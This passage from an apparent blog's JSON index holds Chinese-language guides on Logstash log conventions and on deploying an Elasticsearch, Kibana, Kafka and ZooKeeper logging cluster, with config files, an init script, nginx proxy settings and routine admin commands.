links.","link":"/2016/01/30/日志分析\u0010平台/Elasticsearch/Elasticsearch5.x版本的索引定时自动清理和检测进程状态自动启动/"},{"title":"Logstash分享,online生产环境的使用,online日志规范。","text":"Logstash分享,online生产环境的使用,online日志规范。写这篇文章，主要分享几点: 因为学所有学，既然学何不深度去了解~ 什么是Logstash？ logstash运行在什么环境下对应的版本是多少？ logstash工作原理？ online日志现在是如何规范？ 如何写logstash收集conf文件？ 1. 什么是Logstash？1Logstash 是有管道输送能力的开源数据收集引擎。它可以动态地从分散的数据源收集数据，并且标准化数据输送到你选择的目的地。它是一款日志而不仅限于日志的搜集处理框架，将分散多样的数据搜集自定义处理并输出到指定位置。 2. logstash运行在什么环境下对应的版本是多少？123456logstash更新比较快，跟es一样，2.4以上直接升级到5.0 5.0x以下版本运行环境 需要JDK1.7以上版本.5.0x版本运行环境 需要JDK1.8以上版本。安装方法很多：yum,rpm,tar.gz源码， 支持Docker镜像运行。 3. logstash工作原理？12345678Logstash使用管道方式进行日志的搜集处理和输出。有点类似linux系统的管道命令 xxx | ccc | ddd，xxx执行完了会执行ccc，然后执行ddd。logstash收集日志基本流程: input--&gt;codec--&gt;filter--&gt;codec--&gt;output 1.input:从哪里收集日志。 2.filter:发出去前进行过滤 （不是必须的）3.output:输出至Elasticsearch或Redis消息队列 4.codec:输出至前台，方便边实践边测试 5.数据量不大日志按照月来进行收集 4.日志现在收集规范：是记录用户访问行为和服务运行状态的信息，是应用软件基本的输出单元，做到日志输出位置、命名、格式规范，可以大大方便后续应用服务监控和数据分析。 12345678910111213141516171819202122232425261. 日志目录结构2. 日志类型3. 日志要求配置4. 日志级别5. 日志分割与周期6. 日志保留要求现在我们online 日志规范架构：###之前应用日志规范：一个Tomcat服务logs目录下面的日志：定期对catalina.out几个G按两个小时进行压缩一次，保留7天，每天备份到log-server服务器。logstash收集catalina.out所有日志。###现在应用日志规范:一个Tomcat服务logs目录下面的日志：定期对catalina.out每天1M多日志进行压缩一次，保留7天，每天备份到log-server服务器。logstash收集每台应用输出应用日志：error.log &amp; info.log好处分别为四个： 1.对索引的要求细分和kibana查询日志速度无疑会变更快。2.查询日志快速定位。3.不会对catalina.out日志进行大级别日志写入，那里只存放系统日志，例如：发布日志，请求第三方地址日志。4.日志开发可以在Java代码log4j文件大小指定压缩，每天定时清空，不需要我们写脚本处理。多个脚本定时在运行，特别乱。 5.如何写logstash收集conf文件？下面是我写好的online logstash收集代码，根据之前日志收集方式，现在修过几个地方： 1234567891011121314151617181920212223242526272829303132333435363738394041424344 input &#123; stdin&#123;&#125; #可以标准输入读数据 （可以放可以不放） file &#123; type =&gt; \"tms-task-info\" path =&gt; [\"/data/tms-task_new/logs/info.log\"] start_position =&gt; \"beginning\" #从文件开始处读写 &#125; file &#123; type =&gt; \"tms-task-error\" path =&gt; [\"/data/tms-task_new/logs/error.log\"] start_position =&gt; \"beginning\" #从文件开始处读写 &#125;&#125;filter &#123; #过滤方式 multiline &#123; pattern =&gt; \"^\\d+-\\d+-\\d+\" negate =&gt; true what =&gt; \"previous\" &#125; &#125;output &#123; if [type] == \"tms-task-info\" &#123; elasticsearch &#123; hosts =&gt; [\"10.155.90.141:9200\",\"10.155.90.176:9200\"] index =&gt; \"log-tms-task-info-%&#123;+YYYY.MM.dd&#125;\" document_type =&gt; \"log\" template_overwrite =&gt; true &#125;&#125; if [type] == \"tms-task-error\" &#123; elasticsearch &#123; hosts =&gt; [\"10.155.90.141:9200\",\"10.155.90.176:9200\"] index =&gt; \"log-tms-task-error-%&#123;+YYYY.MM.dd&#125;\" document_type =&gt; \"log\" template_overwrite =&gt; true &#125; &#125;stdout&#123; codec=&gt;rubydebug #控制台输出 (不建议配置，测试阶段可以调试使用) &#125;&#125; 解释12345678910111213141516171819有一些比较有用的配置项，可以用来指定 FileWatch 库的行为：discover_intervallogstash 每隔多久去检查一次被监听的 path 下是否有新文件。默认值是 15 秒。exclude不想被监听的文件可以排除出去，这里跟 path 一样支持 glob 展开。sincedb_path如果你不想用默认的 $HOME/.sincedb(Windows 平台上在 C:\\Windows\\System32\\config\\systemprofile\\.sincedb)，可以通过这个配置定义 sincedb 文件到其他位置。sincedb_write_intervallogstash 每隔多久写一次 sincedb 文件，默认是 15 秒。stat_intervallogstash 每隔多久检查一次被监听文件状态（是否有更新），默认是 1 秒。start_positionlogstash 从什么位置开始读取文件数据，默认是结束位置，也就是说 logstash 进程会以类似 tail -F 的形式运行。如果你是要导入原有数据，把这个设定改成 \"beginning\"，logstash 进程就从头开始读取，有点类似 cat，但是读到最后一行不会终止，而是继续变成 tail -F。 配置详解：参考中文文档logstash-best-practice-cn官网详细说明：multiple-input-output-plugins Communicative learning:🐧 Linux shell_ senior operation and maintenance faction: QQ group 459096184 circle (system operation and maintenance - application operation and maintenance - automation operation and maintenance - virtualization technology research, welcome to join)🐧 BigData-Exchange School:QQ group 521621407 circles (big data Yun Wei) (Hadoop developer) (big data research enthusiasts) welcome to join Bidata have internal WeChat exchange group, learn from each other, join QQ group has links.","link":"/2017/11/13/日志分析\u0010平台/Elasticsearch/Logstash分享,online生产环境的使用,online日志规范。/"},{"title":"搭建(ElasticSearch-2.x Logstash-2.x Kibana-4.5.x zookeeper3.4.6 Kafka ) Kafka为消息中心的ELK日志平台","text":"搭建(ElasticSearch-2.x Logstash-2.x Kibana-4.5.x zookeeper3.4.6) Kafka为消息中心的ELK日志平台介绍ELK是业界标准的日志采集,存储索引,展示分析系统解决方案 logstash提供了灵活多样的插件支持不同的input/output 主流使用redis/kafka作为日志/消息的中间环节 如果已有kafka的环境了,使用kafka比使用redis更佳 以下是一个最简化的配置做个笔记,elastic官网提供了非常丰富的文档 不要用搜索引擎去搜索,没多少结果的,请直接看官网文档 版本及连接elasticseearch版本: 2.4.3 系统要求如果仅作测试用, 不需要两天机器, 可以将两个节点部署在同一台机器上, 对磁盘/cpu要求不高, 内存大于2g基本足够了 如果是正式环境, 需要根据日志量进行评估, 例如, 每天日志量占硬盘约约10G, 且保留30天日志, 则磁盘会占用约300g, es设定的阈值是磁盘空间占满85%则日志开始告警. 所以, 需要至少 300/0.85=354g. 准备4台机器, 在同一个局域网内(可ping通), 分别在每台机器上部署相应es节点, 搭建一套日志集群. 4台机器, 最少的资源了, 但是没法做到高可用, 所以, 还需要再加一台机器, 防止脑裂, 具体见最后(两台主力机器+一台稳定的机器就行) 集群节点: 最少4台机器内存: 8G及以上cpu: 4核及以上硬盘: 800G及以上, 建议1T, 集群容量约10亿级(取决于对应日志大小)操作系统: centos 准备工作: 应用/网络 环境SLB： 阿里云做负载均衡&amp; 或者自己搭建nginx ELK服务端集群： 系统centos 6.7 JDK1.8 版本：Elasticsearch-2.4.0 es_01 10.47.88.206es_02 10.47.88.188 Kibana服务端集群： 系统centos 6.7 JDK1.8 版本：kibana-4.5.1 es_01 10.47.88.206es_02 10.47.88.188 KafKa集群 系统centos 6.7 JDK1.8 版本：kafka_2.10-0.9 kafka_01 10.46.72.172kafka_02 10.47.88.103kafka_03 10.47.102.137 zookeeper集群 系统centos 6.7 JDK1.8 版本：zookeeper-3.4.6 kafka_01 10.46.72.172kafka_02 10.47.88.103kafka_03 10.47.102.137 logstash-2.4 客户端：系统centos 6.7 JDK1.8 版本： logstash-2.4 tomcat-account_01: 10.27.232.85 都要jdk1.8支持。 整体说明数据流向=&gt;日志/消息整体流向logstash =&gt; kafka =&gt; logstash =&gt; elasticsearch =&gt; kibana 部署1. 确认JDK版本及安装es依赖java的版本最小为1.7 如果系统中未安装JDK则命令返回bash: java: command not found, 需要安装JDK 如果系统中安装了JDK, 需确认版本是否大于java 1.7, 否则需要升级 123456789101112java -versionjava version \"1.7.0_51\" Java(TM) SE Runtime Environment (build 1.7.0_51-b13) Java HotSpot(TM) Server VM (build 24.51-b03, mixed mode)安装及升级java(注意根据系统不同运行对应安装命令)# Redhat/Centos/Fedorasudo yum install java-1.7.0-openjdk或者到官网, 下载最新的jdk的rpm包, 然后安装wget http://download.oracle.com/otn-pub/java/jdk/8u91-b14/jdk-8u91-linux-x64.rpmrpm -Uvh jdk-8u91-linux-x64.rpm 再次确认安装成功 1java -version 基本配置设置FQDN：12345678910111213141516171819#修改hostnamecat /etc/hostnamees_01#修改hostscat /etc/hosts127.0.0.1 localhost localhost.localdomain localhost4 localhost4.localdomain4::1 localhost localhost.localdomain localhost6 localhost6.localdomain610.47.88.206 es.ihaozhuo.com es_01#刷新环境hostname -F /etc/hostname#复查结果hostname -fes.ihaozhuo.comhostnamees_01 防火墙配置1234567891011#service iptables stop#setenforce 0不过这里我防火墙是开启的，后期添加出去端口即可。或者可以不关闭防火墙，但是要在iptables中打开相关的端口：# vim /etc/sysconfig/iptables-A INPUT -m state --state NEW -m tcp -p tcp --dport 80 -j ACCEPT-A INPUT -m state --state NEW -m tcp -p tcp --dport 9200 -j ACCEPT-A INPUT -m state --state NEW -m tcp -p tcp --dport 9292 -j ACCEPT# service iptables restart RPM快速安装elk所有安装都可以使用rpm二进制包的方式,增加elastic官网的仓库repo就可以用yum安装了 elasticsearch看这里 —– elasticsearch-rpm官方文档 logstash看这里 —-logstash-rpm官网文档 kibana看这里 —kibana-rpm官网文档 es_01服务端源码安装这里我是源码安装的下载ElasticSearch ElasticSearch默认的对外服务的HTTP端口是9200，节点间交互的TCP端口是9300。 下载地址：Elasticsearch 2.4版本：Elasticsearch2.4.3 1234567891011121314151617181920212223242526解压源码包：[root@es_01 ~]# tar -zxvf elasticsearch-2.4.3.tar.gz -C /usr/local/然后给目录做个软链接：[root@es_01 local]# ln -s /usr/local/elasticsearch-2.4.3/ /usr/local/elasticsearch这里需要修改配置文件：配置前先创建几个目录文件新建目录, 假设/data/目录挂载的硬盘最大(500G以上)[root@es_01 srv]]# mkdir /srv/data/es-data -p[root@es_01 srv]# mkdir /srv/data/es-work [root@es_01 local]# mkdir /usr/local/elasticsearch/logs[root@es_01 local]# mkdir /usr/local/elasticsearch/config/plugins新建用户修改源码目录属性属组：[root@es_01 elasticsearch]# useradd -s /sbin/nologin elasticsearch[root@es_01 elasticsearch]# chown -R elasticsearch:elasticsearch /usr/local/elasticsearch[root@es_01 elasticsearch]# chown -R elasticsearch:elasticsearch /srv/data/切换用户切换到elasticsearch用户, 并进入elasticsearch目录su elasticsearchcd /usr/local/elasticsearch/ 配置Elasticsearch：以用户es的身份进行操作 文件路径: config/elasticsearch.yml修改该文件中配置项: (注意, 原始文件中都是被#号注释掉了, 需要去掉对应注释并修改配置值) 集群名: cluster.name, 注意: 两台机器配置一致 1cluster.name: elk_cluster 节点名: node.name, 注意: 两台机器配置不同, 一台为01, 另一台为02 123456 # 第一台机器 node.name: inner_es_node_01# 第二台机器node.name: inner_es_node_02 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647[root@es_01 config]# vim elasticsearch.yml# Use a descriptive name for your cluster:##cluster.name: elk_cluster## ------------------------------------ Node ------------------------------------## Use a descriptive name for the node:#node.name: es_01## Add custom attributes to the node:## node.rack: r1## ----------------------------------- Paths ------------------------------------## Path to directory where to store the data (separate multiple locations by comma):#path.data: /srv/data/es-data## Path to log files:#path.logs: /usr/local/elasticsearch/logs## ----------------------------------- Memory -----------------------------------## Lock the memory on startup:## bootstrap.memory_lock: true## Make sure that the `ES_HEAP_SIZE` environment variable is set to about half the memory# available on the system and that the owner of the process is allowed to use this limit.## Elasticsearch performs poorly when the system is swapping the memory.## ---------------------------------- Network -----------------------------------## Set the bind address to a specific IP (IPv4 or IPv6):#network.host: 10.47.88.206 切换到elasticsearch用户启动服务。 源码安装启动需要执行 ：/usr/local/elasticsearch/bin/elasticsearch &amp;才能启动； 测试访问服务正常：1234567891011121314[elasticsearch@es_01 elasticsearch]$ curl http://10.47.88.206:9200&#123; \"name\" : \"es_01\", \"cluster_name\" : \"elk_cluster\", \"cluster_uuid\" : \"mspLZT5nTL-d124suNbBBQ\", \"version\" : &#123; \"number\" : \"2.4.3\", \"build_hash\" : \"d38a34e7b75af4e17ead16f156feffa432b22be3\", \"build_timestamp\" : \"2016-12-07T16:28:56Z\", \"build_snapshot\" : false, \"lucene_version\" : \"5.5.2\" &#125;, \"tagline\" : \"You Know, for Search\"&#125; 下面是写开机启动脚本，不写的直接切换es用户到目录启动 -d后台启动。这里需要/etc/init.d/创建启动脚本。 1234567891011121314151617181920212223242526[root@ELK ~]# git clone https://github.com/elastic/elasticsearch-servicewrapper.gitInitialized empty Git repository in /root/elasticsearch-servicewrapper/.git/remote: Counting objects: 184, done.remote: Total 184 (delta 0), reused 0 (delta 0), pack-reused 184Receiving objects: 100% (184/184), 4.55 MiB | 511 KiB/s, done.Resolving deltas: 100% (53/53), done.[root@ELK elasticsearch-servicewrapper]# mv service/ /usr/local/elasticsearch/bin/[root@ELK elasticsearch-servicewrapper]# cd /usr/local/elasticsearch[root@ELK elasticsearch]# /usr/local/elasticsearch/bin/service/elasticsearch install 这里是安装esDetected RHEL or Fedora:Installing the Elasticsearch daemon..[root@ELK elasticsearch]# vim /etc/init.d/elasticsearch 查看安装es启动配置文件[root@ELK elasticsearch]# service elastic search start 启动es Starting Elasticsearch...Waiting for Elasticsearch......running: PID:31360 服务已启动了。启动相关服务service elasticsearch startservice elasticsearch status配置 elasticsearch 服务随系统自动启动# chkconfig --add elasticsearch测试ElasticSearch服务是否正常，预期返回200的状态码# curl -X GET http://localhost:9200 es_02服务端节点：第一步基础配置都是一样的，跟es_01节点一样。 其他只需要到es_01拷贝过来,然后创建下es用户，修改下配置。 12345678910111213141516/usr/local/elasticsearch 目录拷贝到es_02机器。这里需要修改配置文件：配置前先创建几个目录文件[root@es_01 srv]]# mkdir /srv/data/es-data -p[root@es_01 srv]# mkdir /srv/data/es-work 修改源码目录属性属组：[root@es_01 elasticsearch]# useradd -s /sbin/nologin elasticsearch[root@es_01 elasticsearch]# chown -R elasticsearch:elasticsearch /usr/local/elasticsearch/*[root@es_01 elasticsearch]# chown -R elasticsearch:elasticsearch /srv/data/修改配置文件vim elasticsearch.ymlnode.name: es_02network.host: 10.47.88.188其他不需要修改 集群节点es_02测试：1234567891011121314[root@es_02 home]# curl http://10.47.88.188:9200&#123; \"name\" : \"es_02\", \"cluster_name\" : \"elk_cluster\", \"cluster_uuid\" : \"-4Rqn4IzS1GfnsodqZD8Tg\", \"version\" : &#123; \"number\" : \"2.4.3\", \"build_hash\" : \"d38a34e7b75af4e17ead16f156feffa432b22be3\", \"build_timestamp\" : \"2016-12-07T16:28:56Z\", \"build_snapshot\" : false, \"lucene_version\" : \"5.5.2\" &#125;, \"tagline\" : \"You Know, for Search\"&#125; elk集群已安装配置完毕，我这里配置了nginx做下反向代理，走80端口出去。然后在nginx设置下内部公司访问不对外开放。 安装 head、marvel、bigdesk插件:es1.5插件安装是./plugin -install xxx,而es2.4插件安装没有减号./plugin install xxx 1.5版本方法： 1234567891011121314* head插件插件安装方法1：/usr/local/elasticsearch/bin/plugin -install mobz/elasticsearch-head重启es 即可。打开http://localhost:9200/_plugin/head/插件安装方法2：1.https://github.com/mobz/elasticsearch-head下载zip 解压2.建立/usr/local/elasticsearch/plugins/head/文件3.将解压后的elasticsearch-head-master文件夹下的文件copy到/usr/local/elasticsearch/plugins/head/重启es 即可。打开http://localhost:9200/_plugin/head/ 2.4版本以上安装： 1234567891011121314* head插件插件安装方法1：/usr/local/elasticsearch/bin/plugin install mobz/elasticsearch-head重启es 即可。打开http://localhost:9200/_plugin/head/插件安装方法2：1.https://github.com/mobz/elasticsearch-head下载zip 解压2.建立elasticsearch-1.0.0\\plugins\\head\\_site文件3.将解压后的elasticsearch-head-master文件夹下的文件copy到_site重启es 即可。打开http://localhost:9200/_plugin/head/ 为了保障搜索服务的稳定性，增加了一台机器，将Elasticsearch部署成了集群模式， 部署到生产环境时发现，新的节点并不能被发现，后台发现阿里云并不支持多播，最后只能改为单播的方式配置了，好在之后一切顺利。 下面附上测试环境配置示例：添加下下面监听集群IP和端口。 es_01 1234[root@es_01 config]# vim elasticsearch.ymldiscovery.zen.ping.multicast.enabled: falsediscovery.zen.ping.unicast.hosts: [\"10.47.88.206:9300\",\"10.47.88.188:9300\"] es_02 1234[root@es_02 config]# vim elasticsearch.ymldiscovery.zen.ping.multicast.enabled: falsediscovery.zen.ping.unicast.hosts: [\"10.47.88.206:9300\",\"10.47.88.188:9300\"] 然后重启服务，查看集群节点。 es_02安装Kibana:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118到https://www.elastic.co/downloads/kibana 找合适的版本。wget https://download.elastic.co/kibana/kibana/kibana-4.5.1-linux-x64.tar.gz#解压＃tar zxvf kibana-4.1.2-linux-x64.tar.gz -C /usr/local ＃cd /usr/local/ &amp;&amp; mv kibana-4.1.2-linux-x64 kibana#创建kibana启动脚本服务vi /etc/rc.d/init.d/kibana#!/bin/bash### BEGIN INIT INFO# Provides: kibana# Default-Start: 2 3 4 5# Default-Stop: 0 1 6# Short-Description: Runs kibana daemon# Description: Runs the kibana daemon as a non-root user### END INIT INFO# Process nameNAME=kibanaDESC=\"Kibana4\"PROG=\"/etc/init.d/kibana\"# Configure location of Kibana binKIBANA_BIN=/usr/local/kibana/bin# PID InfoPID_FOLDER=/var/run/kibana/PID_FILE=/var/run/kibana/$NAME.pidLOCK_FILE=/var/lock/subsys/$NAMEPATH=/bin:/usr/bin:/sbin:/usr/sbin:$KIBANA_BINDAEMON=$KIBANA_BIN/$NAME# Configure User to run daemon processDAEMON_USER=root# Configure logging locationKIBANA_LOG=/var/log/kibana.log# Begin ScriptRETVAL=0if [ `id -u` -ne 0 ]; then echo \"You need root privileges to run this script\" exit 1fi# Function library. /etc/init.d/functions start() &#123; echo -n \"Starting $DESC : \"pid=`pidofproc -p $PID_FILE kibana` if [ -n \"$pid\" ] ; then echo \"Already running.\" exit 0 else # Start Daemonif [ ! -d \"$PID_FOLDER\" ] ; then mkdir $PID_FOLDER fidaemon --user=$DAEMON_USER --pidfile=$PID_FILE $DAEMON 1&gt;\"$KIBANA_LOG\" 2&gt;&amp;1 &amp; sleep 2 pidofproc node &gt; $PID_FILE RETVAL=$? [[ $? -eq 0 ]] &amp;&amp; success || failureecho [ $RETVAL = 0 ] &amp;&amp; touch $LOCK_FILE return $RETVAL fi&#125;reload()&#123; echo \"Reload command is not implemented for this service.\" return $RETVAL&#125;stop() &#123; echo -n \"Stopping $DESC : \" killproc -p $PID_FILE $DAEMON RETVAL=$?echo [ $RETVAL = 0 ] &amp;&amp; rm -f $PID_FILE $LOCK_FILE&#125; case \"$1\" in start) start;; stop) stop ;; status) status -p $PID_FILE $DAEMON RETVAL=$? ;; restart) stop start ;; reload)reload;; *)# Invalid Arguments, print the following message. echo \"Usage: $0 &#123;start|stop|status|restart&#125;\" &gt;&amp;2exit 2 ;;esac修改启动权限chmod +x /etc/rc.d/init.d/kibana 配置Kibana： 编辑kibana.yaml 修改端口，设置host 可以设置本地服务器IP123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657vim /usr/local/kibana/config/kibana.yml# Kibana is served by a back end server. This controls which port to use.server.port: 5601# The host to bind the server to.server.host: \"10.47.88.188\"# If you are running kibana behind a proxy, and want to mount it at a path,# specify that path here. The basePath can't end in a slash.# server.basePath: \"\"# The maximum payload size in bytes on incoming server requests.# server.maxPayloadBytes: 1048576# The Elasticsearch instance to use for all your queries.elasticsearch.url: \"http://10.47.88.188:9200\"# preserve_elasticsearch_host true will send the hostname specified in `elasticsearch`. If you set it to false,# then the host you use to connect to *this* Kibana instance will be sent.elasticsearch.preserveHost: true# Kibana uses an index in Elasticsearch to store saved searches, visualizations# and dashboards. It will create a new index if it doesn't already exist.# kibana.index: \".kibana\"# The default application to load.kibana.defaultAppId: \"discover\"# If your Elasticsearch is protected with basic auth, these are the user credentials# used by the Kibana server to perform maintenance on the kibana_index at startup. Your Kibana# users will still need to authenticate with Elasticsearch (which is proxied through# the Kibana server)# elasticsearch.ssl.key: /path/to/your/client.key# If you need to provide a CA certificate for your Elasticsearch instance, put# the path of the pem file here.# elasticsearch.ssl.ca: /path/to/your/CA.pem# Set to false to have a complete disregard for the validity of the SSL# certificate.# elasticsearch.ssl.verify: true# Time in milliseconds to wait for elasticsearch to respond to pings, defaults to# request_timeout setting# elasticsearch.pingTimeout: 1500# Time in milliseconds to wait for responses from the back end or elasticsearch.# This must be &gt; 0elasticsearch.requestTimeout: 30000# Time in milliseconds for Elasticsearch to wait for responses from shards.# Set to 0 to disable.# elasticsearch.shardTimeout: 0 启动kibana服务12service kibana startservice kibana status 查看端口12345678910netstat -nltp[root@es_02 config]# netstat -nltpActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program nametcp 0 0 127.0.0.1:32000 0.0.0.0:* LISTEN 2517/javatcp 0 0 10.47.88.188:5601 0.0.0.0:* LISTEN 6474/nodetcp 0 0 10.47.88.188:10050 0.0.0.0:* LISTEN 305/zabbix_agentdtcp 0 0 10.47.88.188:9200 0.0.0.0:* LISTEN 5198/javatcp 0 0 10.47.88.188:9300 0.0.0.0:* LISTEN 5198/javatcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 25265/sshd 到我Github上面下载kabana启动脚本。 es_01机器从es_02机器拷贝过去修改下配置就可以。 kibana安装插件参考：Installing Marvel 这里kibana我做了nginx反向代理，集群代理。 nginx配置kibana反向代理：这里我只允许我公司IP访问： 1234567891011121314151617181920 upstream kibana.ihaozhuo.com &#123; server 10.47.88.206:5601 weight=1; server 10.47.88.188:5601 weight=1;&#125; server &#123; listen 80; server_name kibana.ihaozhuo.com; location / &#123; index index.html index.php index.jsp index.htm; allow 202.107.202.82/32; deny all; proxy_pass http://kibana.ihaozhuo.com; proxy_ignore_client_abort on; proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125; &#125;&#125; KafKa集群搭建123下载地址：http://mirrors.hust.edu.cn/apache/kafka/0.9.0.0/kafka_2.10-0.9.0.0.tgz[root@kafka_01 srv]# tar -xvf kafka_2.10-0.9.0.0.tgz[root@kafka_01 srv]# mv kafka_2.10-0.9.0.0 kafka 修改kafka配置文件 12345678910111213141516[root@kafka_01 config]# vim /srv/kafka/config/server.properties#设置brokerid（从0开始，3个节点分别设为0,1,2，不能重复）在这里id=0跟zookeeper id设置一样就行。 集群机器：按顺序写1broker.id=0 #设置data目录，最好不要用默认的/tmp/kafka-logsmkdir -p /srv/kafka/data/kafka-logs #修改本地IP地址：listeners=PLAINTEXT://10.46.72.172:9092 log.dirs=/srv/kafka/data/kafka-logs#设置注册地址（重要，默认会把本机的hostanme注册到zk中，客户端连接时需要解析该hostanme，所以这里直接注册本机的IP地址，避免hostname解析失败，报错java.nio.channels.UnresolvedAddressException或java.io.IOException: Can not resolve address）#设置zookeeper地址zookeeper.connect=10.46.72.172:2181,10.47.88.103:2181,10.47.102.137:2181 配置zookeeper地址 1234567vim zookeeper.properties dataDir=/home/jollybi/tools/zookeeper-3.4.5/tmp# the port at which the clients will connectclientPort=2281# disable the per-ip limit on the number of connections since this is a non-production configmaxClientCnxns=0~ 配置kafka访问地址 1234567891011121314vim producer.properties metadata.broker.list=169.44.62.139:9292,169.44.59.138:9292,169.44.62.137:9292 # name of the partitioner class for partitioning events; default partition spreads data randomly#partitioner.class=# specifies whether the messages are sent asynchronously (async) or synchronously (sync)producer.type=sync# specify the compression codec for all data generated: none, gzip, snappy, lz4.# the old config values work as well: 0, 1, 2, 3 for none, gzip, snappy, lz4, respectivelycompression.codec=none# message encoderserializer.class=kafka.serializer.DefaultEncoder Kafka常用命令(普及)123456789101112131415161718192021222324Kafka常用命令以下是kafka常用命令行总结： 1.查看topic的详细信息 ./kafka-topics.sh -zookeeper 127.0.0.1:2181 -describe -topic testKJ1 2、为topic增加副本 ./kafka-reassign-partitions.sh -zookeeper 127.0.0.1:2181 -reassignment-json-file json/partitions-to-move.json -execute 3、创建topic ./kafka-topics.sh --create --zookeeper localhost:2181 --replication-factor 1 --partitions 1 --topic testKJ1 4、为topic增加partition ./bin/kafka-topics.sh –zookeeper 127.0.0.1:2181 –alter –partitions 20 –topic testKJ1 5、kafka生产者客户端命令 ./kafka-console-producer.sh --broker-list localhost:9092 --topic testKJ1 6、kafka消费者客户端命令 ./kafka-console-consumer.sh -zookeeper localhost:2181 --from-beginning --topic testKJ1 7、kafka服务启动 ./kafka-server-start.sh -daemon ../config/server.properties 8、下线broker ./kafka-run-class.sh kafka.admin.ShutdownBroker --zookeeper 127.0.0.1:2181 --broker #brokerId# --num.retries 3 --retry.interval.ms 60 shutdown broker 9、删除topic ./kafka-run-class.sh kafka.admin.DeleteTopicCommand --topic testKJ1 --zookeeper 127.0.0.1:2181 ./kafka-topics.sh --zookeeper localhost:2181 --delete --topic testKJ1 10、查看consumer组内消费的offset ./kafka-run-class.sh kafka.tools.ConsumerOffsetChecker --zookeeper localhost:2181 --group test --topic testKJ1 Kafka群集新建一个Topic叫做logstash Topic 12345678910111213141516#查看tocpic列表（--zookeeper指定任意一个zk节点即可，用于获取集群信息）/usr/local/kafka/bin/kafka-topics.sh --zookeeper zk1.yazuoyw.com:2181 --describe #创建topic（--replication-factor表示复制到多少个节点，--partitions表示分区数，一般都设置为2或与节点数相等，不能大于总节点数）/usr/local/kafka/bin/kafka-topics.sh --zookeeper zk1.yazuoyw.com:2181 --create --topic topic1 --replication-factor 2 --partitions 2 #发送消息（--topic 指定topic）/usr/local/kafka/bin/kafka-console-producer.sh --broker-list kafka1.yazuoyw.com:9092,kafka2.yazuoyw.com:9092,kafka3.yazuoyw.com:9092 --topic topic1message1message2 #消费消息/usr/local/kafka/bin/kafka-console-consumer.sh --zookeeper zk1.yazuoyw.com:2181 --topic topic1#replica检查/usr/local/kafka/bin/kafka-replica-verification.sh --broker-list kafka1.yazuoyw.com:9092,kafka2.yazuoyw.com:9092,kafka3.yazuoyw.com:9092 每条发布到Kafka集群的消息都有一个类别，这个类别被称为topic。（物理上不同topic的消息分开存储，逻辑上一个topic的消息虽然保存于一个或多个broker上但用户只需指定消息的topic即可生产或消费数据而不必关心数据存于何处） ElasticSearch机器logstash把数据从kafka存到elasticsearch的配置 其中选取kafka群集任意一个有zk的ip做连接使用 topic_id就是kafka中设置的topic logstash 在es上面安装logstash配置/usr/local/logstash/config/kafka_to_es.conf 1234567891011121314151617 input &#123; kafka &#123; zk_connect =&gt; \"10.46.72.172:2181,10.47.88.103:2181,10.47.102.137:2181/kafka\" group_id =&gt; \"logstash\" topic_id =&gt; \"logstash\" reset_beginning =&gt; false # boolean (optional)， default: false consumer_threads =&gt; 2 # number (optional)， default: 1 decorate_events =&gt; false # boolean (optional)， default: false &#125; &#125; output &#123; elasticsearch &#123; hosts =&gt; [\"10.47.88.206:9200\",\"10.47.88.188:9200\"] index =&gt; \"%&#123;host&#125;-%&#123;+YYYY.MM.dd&#125;\"&#125; # stdout &#123; codec =&gt; rubydebug &#125; &#125; 新建了个测试的，测试下发送是否成功：/usr/local/logstash/config/stdin_to_es.conf 123456789input &#123; stdin &#123;&#125;&#125; output &#123; elasticsearch &#123; hosts =&gt; \"10.47.88.206\"&#125; stdout &#123; codec =&gt; rubydebug &#125; &#125; Step 2: 启动服务1234567891011121314Kafka用到了Zookeeper，所有首先启动Zookper，下面简单的启用一个单实例的Zookkeeper服务。可以在命令的结尾加个&amp;符号，这样就可以启动后离开控制台。#现在启动Kafka:/srv/kafka/bin/kafka-server-start.sh -daemon config/server.properties#添加开机启动echo ‘# start kafka/usr/local/kafka/bin/kafka-server-start.sh -daemon /usr/local/kafka/config/server.properties‘ &gt;&gt; /etc/rc.local #关闭/usr/local/kafka/bin/kafka-server-stop.sh kafka配置防火墙：1-A INPUT -i eth0 -p tcp -m state --state NEW -m tcp --dport 4888 -j ACCEPT zookeeper集群查看我之前写的这篇文档 ZooKeeper的集群快速搭建与优化 走kafka查看是否所有节点都启动：1234567891011121314[root@kafka_03 bin]# sh zkCli.shConnecting to localhost:21812017-01-04 19:20:24,849 [myid:] - INFO [main:Environment@100] - Client environment:zookeeper.version=3.4.6-1569965, built on 02/20/2014 09:09 GMT2017-01-04 19:20:24,853 [myid:] - INFO [main:Environment@100] - Client environment:host.name=kafka_032017-01-04 19:20:24,853 [myid:] - INFO [main:Environment@100] - Client environment:java.version=1.8.0_662017-01-04 19:20:24,856 [myid:] - INFO [main:Environment@100] - Client environment:java.vendor=Oracle Corporation2017-01-04 19:20:24,856 [myid:] - INFO [main:Environment@100] - Client environment:java.home=/srv/jdk1.8.0_66/jre2017-01-04 19:20:24,856 [myid:] - INFO [main:Environment@100] - Client environment:java.class.path=/srv/zookeeper-3.4.6/bin/../build/classes:/srv/zookeeper-3.4.6/bin/../build/lib/*.jar:/srv/zookeeper-3.4.6/bin/../lib/slf4j-log4j12-1.6.1.jar:/srv/zookeeper-3.4.6/bin/../lib/slf4j-api-1.6.1.jar:/srv/zookeeper-3.4.6/bin/../lib/netty-3.7.0.Final.jar:/srv/zookeeper-3.4.6/bin/../lib/log4j-1.2.16.jar:/srv/zookeeper-3.4.6/bin/../lib/jline-0.9.94.jar:/srv/zookeeper-3.4.6/bin/../zookeeper-3.4.6.jar:/srv/zookeeper-3.4.6/bin/../src/java/lib/*.jar:/srv/zookeeper-3.4.6/bin/../conf:2017-01-04 19:20:24,856 [myid:] - INFO [main:Environment@100] - Client environment:java.library.path=/usr/java/packages/lib/amd64:/usr/lib64:/lib64:/lib:/usr/lib[zk: localhost:2181(CONNECTED) 0] ls /[controller_epoch, brokers, zookeeper, kafka, dubbo, admin, isr_change_notification, consumers, config, sthp][zk: 